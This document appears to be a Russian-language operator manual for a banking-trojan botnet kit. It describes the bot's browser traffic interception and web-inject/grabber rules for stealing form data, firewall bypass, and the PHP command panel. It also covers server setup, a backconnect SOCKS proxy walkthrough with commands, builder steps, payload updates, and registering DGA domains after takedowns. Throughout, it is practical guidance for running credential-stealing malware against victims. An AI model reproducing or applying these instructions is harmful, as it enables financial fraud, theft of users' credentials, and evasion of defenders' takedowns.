Описание: Бот

  • Язык и IDE программирования:

    Visual C++, используются библиотеки openssl, zlib.

  • Поддерживаемые ОС:

    XP-Win10(x86/x64) включая серверные сборки. Полноценная работа с минимальными привилегиями.

  • Сессия с сервером:

    Сессия с сервером осуществляется через различные процессы из внутреннего "белого списка", что позволяет обойти большинство фаерволов. Во время сессии бот может получить конфигурацию, отправить накопившиеся отчеты, сообщить о своем состоянии серверу, и получить команды для исполнения на компьютере. Сессия происходит через HTTP(S)-протокол, все данные отсылаемые ботом и получаемые от сервера шифруются уникальным ключом для каждого ботнета.

  • Защита:

    1. Уникальные имена всех объектов (файлов, мютексов, ключей реестра) создаваемых ботом для каждого пользователя.
    2. Автообновление бота, не требующие перезагрузки.
    3. Контроль цельности файлов бота и записей в реестре.

  • Перехват HTTP/HTTPS-запросов (Opera, Safari, Internet Explorer, Mozilla Firefox, Google Chrome):

    1. Модификация содержимого загружаемых страниц (HTTP-инжект).
    2. Получение из содержимого страницы нужных частей данных.
    3. Временная блокировка HTTP-инжектов.
    4. Временная блокировка доступа к определённым URL.
    5. Блокировка логирования запросов для определённых URL.
    6. Принудительное логирование всех GET запросов для определённых URL.

  • Прочее:

    1. Исполнение скриптов (команд), созданных в панели управления.

Описание: Панель управления

  • Язык программирования:

    PHP, с использованием расширений mbstring, mysqli.

  • Отображаемая статистика:

    1. Количество зараженных компьютеров.
    2. Количество ботов онлайн за последние 24 часа.
    3. Количество ботов онлайн за последние 7 дней.
    4. Количество новых ботов за последние 24 часа.
    5. Количество новых ботов за последние 7 дней.
    6. Текущее количество ботов в онлайне.
    7. Количество мёртвых ботов (которых не было в сети более чем 7 дней).
    8. Количество HTTP(S) отчётов.
    9. Количество HTTP(S) отчётов за сегодня.
    10. Статистика по ОС.
    11. Статистика по странам.

  • Работа со списком ботов:

    1. Фильтрация списка по странам, IP-адресам, NAT-статусу, и т.д.
    2. Вывод полной информации о ботах. Из наиболее важных сюда входят:
      • Версия бота.
      • Страна и IP-адреса компьютера (не относящиеся к локальным).
      • Время в онлайне.

  • Скрипты (команды):

    Вы можете управляет ботами путем составления для них скриптов. В настоящее время синтаксис, и возможности скриптов очень примитивны.

  • Работа с отчетами (логами):

    Поиск логов по ID ботов и ключевым словам.

  • DGA (Domain Generation Algorithm):

    Каждый день генерируеться новый список из 128 доменов. Функция нужна в случае блокировки как основного так и резервных доменов.

Файл конфигурации: основная информация.

[StaticConfig] - содержиться в loader.exe.
  • botnet

    - имя для ботнета (не должно меняться на протяжение всей жизни ботнета).

  • timer_logs [? - успех] [? - ошибка]

    - интервалы для отправки отчётов (в минутах).

    пример: "timer_logs 20 3"

  • timer_stats [? - успех] [? - ошибка]

    - интервалы для отстука бота (в минутах).

    пример: "timer_stats 15 2"

  • url_config

    - адрес по которому будет скачиваться конфиг(config.bin), только при установке.

  • url_bot

    - адрес по которому будет скачиваться модуль(bot.bin), только при установке.

  • encryption_key

    - ключ шифрования для связи бота с командным центром.

  • debug

    - режим отладки (нужен для запуска на локальной RU машине и отладки инжектов).

    пример: "debug 1" - включить (для отладки)
    пример: "debug 0" - выключить (для релиза)

    При "debug 1" бот игнорирует "timer_logs" и "timer_stats", отстукивает и шлёт логи каждую секунду.
[DynamicConfig] - содержиться в config.bin.

  • url_server

    - адрес для отстука бота(gate.php).

  • AdvancedConfigs

    - резервные адреса для скачивания config.bin, если основной адрес(url_server) не доступен.

  • WebFilters

    - адреса которые нужно принудительно писать в отчёт или же наоборот используя флаг отрицания '!', допускаеться использование масок.

    пример: "!https://*facebook.*" - игнорировать.

Бот работает как с http так и https(рекомендовано).

Файл конфигурации: HTTP-инжекты/HTTP-грабберы.

Для удобства написания, HTTP-инжекты/HTTP-грабберы записываются в отдельный файл "webinjects.txt". Естественно, после создания конченого файла конфигурации, ни какие дополнительные файлы не генерируются.

Файл представляет из себя список URL'ов, для которых можно указать неограниченное количество либо вносимых в них изменений, либо получаемых из них данных. Текущий URL указывается следующей строкой:

set_url [url] [options] [postdata_blacklist] [postdata_whitelist] [url_block] [matched_context]

Параметры:

url URL, на котором должен запускаться HTTP-инжект/HTTP-граббер. Допускается использование масок (символы * и #).
options Определяет основные правила и условия для запсука, состоит из комбинации следующих символов:
  • P - запускать при POST-запросе.
  • G - запускать при GET-запросе.
  • L - если этот сивол указан, то запуск происходит как HTTP-граббера, если не указан, то как HTTP-инжекта.
  • D - блокирует запуск более одного раза в 24 часа. Этот символ требует обязательного наличия параметра url_block.
  • H - дополняет символ "L", сохраняет содержимое без вырезания HTML-тегов. В обычном же режиме, все HTML-теги удаляются, а некоторые преобразуются в символ "новая строка" или "пробел".
  • I - сравнивать параметр url без учета регистра (только для англ. алфавита).
  • C - сравнивать конекст без учета регистра (только для англ. алфавита).
  • B - блокировка выполнения инжекта.
postdata_blacklist Полное (от начала до конца) содержимое POST-данных, при котором не должен происходить запуск. Допускается использование масок (символы * и ?).

Параметр является необязательным.
postdata_whitelist Полное (от начала до конца) содержимое POST-данных, при котором должен происходить запуск. Допускается использование масок (символы * и ?).

Параметр является необязательным.
url_block При отсутствии символа "D" в параметре options:

Если запуск должен происходить только один раз, то здесь следует указать URL, в случаи обращения к которому, дальнеший запуск будет заблокирован. Ожидание этого URL начинается сразу после применения HTTP-инжекта/HTTP-граббера. Если после блокировки, понадобится повторный запуск, то блокировку можно снять через команду "bot_httpinject_enable" с параметром, например, равному параметру url.

При наличии символа "D" в параметре options:

Необходимо указать URL, при обращении к которому, запуск будет заблокирован на 24-е часа. Ожидание этого URL начинается сразу после применения HTTP-инжекта/HTTP-граббера. Эту блокировку нельзя снять через через команду "bot_httpinject_enable".

Параметр является необязательным при отсутствии символа "D" в параметре options.
matched_context Подсодержимое (подстрока) содеримого URL, при котором должен происходить запуск. Допускается использование масок (символы * и ?).

Параметр является необязательным.

Со следующей строки начинается список изменений вносимых, в содержимое URL, а при наличии символа "L" в параметре options - список данных, получаемых из содержимое URL. Это список длится до тех пор, пока не достигнут конец файла, или не задан новый URL.

Единица списка состоит из трех элементов в произвольном порядке:

data_before При отсутвие символа "L" в параметре options:

Подсодержиоме в соедржимом URL, после окончания которого нужно внести новые данные.

При наличии символа "L" в параметре options:

Подсодержиоме в соедржимом URL, после окончания которого нужно начать получить данные для отчета.

Допускается использование масок (символы * и ?).
data_after При отсутвие символа "L" в параметре options:

Подсодержиоме в соедржимом URL, передкоторым нужно закончить новые данные.

При наличии символа "L" в параметре options:

Подсодержиоме в соедржимом URL, после окончания которого нужно закончить получать данные для отчета.

Допускается использование масок (символы * и ?).
data_inject При отсутвие символа "L" в параметре options:

Новые данные, который будут внесены между данными найденысмм по data_before и data_after.
Допускаеться использование макроса %BOTID%.

При наличии символа "L" в параметре options:

Подсодержиоме в соедржимом URL, после окончания которого нужно закончить получать данные для отчета.

Панель управления: Настройка сервера

Сервер является центральной точкой управления ботнетом, он занимается сборкой отчетов ботов, и отдачей команд ботам. Крайне не рекомендуется использовать "Виртуальный Хостинг" или "VDS", т.к. при увеличение ботнета, нагрузка на сервер будет увеличиваться, и такой вид хостинга довольно быстро исчерпает свои ресурсы. Вам нужен "Выделенный сервер" (Дедик), рекомендуемая минимальная конфигурация:

  • 2Гб ОЗУ.
  • 2x процессор частотой 2Ггц.
  • Отдельный винчестер для базы данных.
  • Операционная система Linux/Windows.

  • Интерпретатор PHP:

    Последняя версия панели управления разрабатывалась на PHP 5.3. Поэтому крайне рекомендуется использовать версию, не ниже этой версии.

    Важно произвести следующие настройки в php.ini:

    • safe_mode = Off
    • magic_quotes_gpc = Off
    • magic_quotes_runtime = Off
    • short_open_tag = On (в 5.4+ включен по умолчанию)

    а также рекомендуется изменить следующие настройки:

    • display_errors = Off

  • MySQL-сервер:

    MySQL требуется для хранения всех данных об ботнете. Рекомендуемая версия не ниже 5.1.30, так же стоит учесть, что при работе панели управления в более старых версиях были обнаружены некоторые проблемы. Все таблицы панели управления идут в формате MyISAM, важно правильно оптимизировать быстродействие работы с этим форматом, исходя из доступных ресурсов сервера.

    Рекомендуется внести следующие изменения в настройки MySQL-сервера (my или my.ini):

    • max_connections=2000 #Или выше

    Загрузить MySQL: http://dev.mysql.com/downloads/.

    • Панель управления: Установка

    Назначение файлов и папок:

    /installинсталлятор (удалить всю папку после установки)
    /coreсистемные файлы
    /core/config.phpфайл конфигурации
    /templateфайлы темы (дизайн)
    /gate.phpфайл для отстука ботов (переименовать)
    /cp.phpвход в панель управления (переименовать)
    /index.phpпустой файл для предотвращения листинга файлов

    Панель управления лежит в папке "www". Все содержимое этой папки необходимо загрузить на сервер в любую папку доступную по HTTP. Если Вы загружаете ее через FTP, то все файлы нужно загрузить в БИНАРНОМ режиме.

    Для nix-систем выставите права:

    /tmp777
    /core777

    После того как все файлы загружены и для них выставлены права, необходимо через браузер запустить инсталлятор по URL http://сервер/install/index.php (установка затягиваеться, потому что распаковываеться гео база). Следуйте появившимся инструкциям, в случаи возникновения ошибок будет уведомление.

    [Site]

    - user: (имя для входа в панель управления)

    - password: (пароль для входа в панель управления)

    [Mysql]

    - host: (ip адрес сервера)

    - user: (имя пользователя базы данных)

    - password: (пароль пользователя базы данных)

    - database: (имя базы данных которая должная существовать)

    [Botnet]

    - encryption key: (ключ шифрования ботнета который был указан в конфиг файле как "encryption_key").

    - bot timeout: (интервал отстука бота который был указан в конфиг файле как "timer_stats") + 2-5 минут.

    После установки, необходимо удалить папку install, переименовать файлы cp.php, gate.php и сохранить себе в другое место redir.php, расширение менять нельзя.

    Работа с Backсonnect-сервером

    Работа с BackConnect рассматривается в виде примера.

    • IP-адрес Backconnect-сервера: 192.168.100.1.
    • Порт для бота: 4500.
    • Порт для клиентского приложения: 1080.
    • Сервис бота: socks.

    1. Запускается серверное приложение(bcs.exe) на сервере имеющем свой IP-адрес в интернете, для приложения указывается порт, на котором ожидается подключение от бота, и порт к которому будет подключаться клиентское приложение. Например bcs.exe listen -cp:1080 -bp:4500, где 1080 - клиентский порт, 4500 - порт для бота.

    2. Необходимому боту отправляется команда "bot_bc_add socks 192.168.100.1 4500".

    3. Теперь необходимо ждать подключение бота к серверу, в этот период любая попытка клиентского приложения подключится будет игнорироваться (будет происходить отключение клиента). Знаком подключения бота, будет вывод в консоль сервера строки "Accepted new conection from bot...".

    4. После подключения бота, Вы можете работать со своим клиентским приложением. Т.е. Вы просто подключаетесь к серверу на клиентский порт (в данном случаи 1080). Например, если Вы отдали команду socks, то на клиентском порту вас будет ожидать Socks-сервер.

    5. После того, когда вам не нужен Backconnect от бота для определенного сервиса, необходимо отдать команду "bot_bc_remove socks 192.168.100.1 4500".

    ПРИМЕЧАНИЯ:

    1. Вы можете указывать сколько угодно Backconnect'ов (т.е. bot_bc_add), но у них не должна быть общая комбинация IP + Port. Но в случаи наличия такой комбинации, будет запускаться первая добавленная.
    2. Для каждого Backconnect'а, Вы должны запускать отдельное серверное приложение.
    3. В случаи разрыва соединения (падения сервера, падение бота и т.д.), бот будет повторят подключение к серверу бесконечно (даже после перезагрузки PC), до тех пор пока Backconnect не будет удален (т.е. bot_bc_remove).
    4. В качестве service для bot_bc_add, может быть использован любой порт открытый по адресу 127.0.0.1.
    5. Серверное приложение поддерживает IPv6, но в настоящее время эта поддержка не особо актуальна.
    6. Возможен запуск серверного приложения под wine. Написание же elf приложения в настоящее время не планируется.
    7. Крайне рекомендуется использовать в опции bp серверного приложения популярные порты (80, 8080, 443 и т.д.), т.к. иные порты могут быть заблокированы провайдером которому принадлежит бот.
    8. Нельзя позволят подключатся разным ботам на один и тот же серверный порт одновременно.
    9. Метод такого подключения может пригодиться и для ботов, которые находятся вне NAT, т.к. иногда фаерволами Windows или провайдерами, могут быть заблокированы подключения из интернета.

    Builder: Описание

    • 1) build bot

      - выходной файл "loader.exe" (вшитый StaticConfig + public_key.pem).

      - выходной файл "bot.bin".

    • 2) build config

      - выходной файл "config.bin" (DynamicConfig + webinjects).

    • 3) build keys

      - cоздаёт пару ключей для подписи config.bin.
      - выходные файлы "private_key.pem" и "public_key.pem".

      Ключи не меняються на протяжение всей жизни ботнета (рекомендовано).

    • 4) generate certificate

      - cоздаёт сертификат и закрытый ключ к нему.
      - выходные файлы "certificate/cert.pem" и "certificate/key.pem".

      Нужен для веб сервера, если нужно работа по https, сертификат создаёться конечно же не валидный, бот игнорирует это.
      Сертификат можно создать в любом другом месте, без разници откуда и чей сертификат.

    Builder: Шаг за шагом

    • Создаём ключи (3).

      - храним у себя на локальной машине.
      - ключи генерируеться один раз для каждого из ботнетов, можно использовать одни и те же ключи для разных ботнетов.

    • Создаём билд бота (1).

      - требует наличие ключей.

      - информация в StaticConfig должна быть заполнена.

    • Создаём конфиг (2).

      - требует наличие ключей.

      - создаёться каждый раз при изменение инжектов либо DynamicConfig.

    • Создаём сертификаты для SSL (4).

      - настоятельно рекомендую использовать SSL, повышает FUD ваших доменов.

    Общая информация: Обновления

    Для того чтобы обновить файлы (loader.exe, bot.bin, config.bin) нужно зайти в админку и перейти на вкладку "Updater" и вбить актуальный линк для файла который следует обновить и нажать кнопочку "Update".
    Линк и файл который лежит по нему неубирать пока нужно чтобы боты его обновляли.
    Имена файлов по адресам должны отличаться от орыгинальных.
    • loader.exe > [URL loader] > http(s)://[path]/a1.exe;

    • bot.bin > [URL bot] > http(s)://[path]/a2m.bin;

    • config.bin > [URL config] > http(s)://[path]/a3c.bin;

    Алгоритм обновления такой:
    • Бот отстукивает каждые timer_stats .
    • Админка выдаёт чексуммы файлов + пути к ним.
    • Бот сверяет чексуммы выданные админкой и в случае если чексумма какого-то файла выданого админкой отличаеться от чексуммы файла бота, то файл скачиваеться через указаный путь и обновляеться.
    В случае кривого крипта, файл просто не отработает, и бот продолжит стабильно функционировать.

    Общая информация: DGA

    И так, ваши домены все побанили, поможет нам DGA, идём в админку смотрим домены к примеру на завтра, выбираем один и быстро регаем его и как можно быстрее вяжем к серверу.
    Сразу конечно лучше регнуть доменов на 3-4 дня вперёд и повыкладывать на них конфиги, боты по мере появления онлайн подхватят новые конфиги.

    Режим отладки

    Для того чтобы инжекты смог писать и отлаживать другой человек, сделайте ему отладочный билд где впишите в url_config и url_bot адреса его локального машины, куда он выложит эти файлы.
    Дайте ему loader.exe, bot.bin, builder_debug.exe, и заполненый вами config.txt [StaticConfig], чтобы он смог заполнить [DynamicConfig] и собрать config.bin.

    При "debug 0" грабер и инжекты не будут работать на русскоязычных системах.
